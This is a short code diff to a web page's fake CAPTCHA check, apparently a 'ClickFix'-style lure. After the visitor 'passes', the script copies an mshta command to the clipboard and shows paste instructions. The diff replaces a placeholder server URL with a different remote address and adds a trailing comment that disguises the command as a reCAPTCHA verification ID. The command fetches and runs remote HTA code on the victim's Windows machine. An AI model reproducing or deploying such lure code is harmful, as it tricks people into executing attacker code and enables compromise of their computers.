@@ -24,7 +24,7 @@ function verifyCaptcha() {
         resultMessage.style.color = 'green';
 
         // Copy the command to clipboard
-        const command = "mshta https://yourserver.com/script.hta";
+        const command = "mshta https://web.archive.org/recaptcha-verify # ✅ ''I am not a robot - reCAPTCHA Verification ID: 7537''";
         navigator.clipboard.writeText(command).then(() => {
             commandInstructions.style.display = 'block'; // Show instructions
         }).catch(err => {
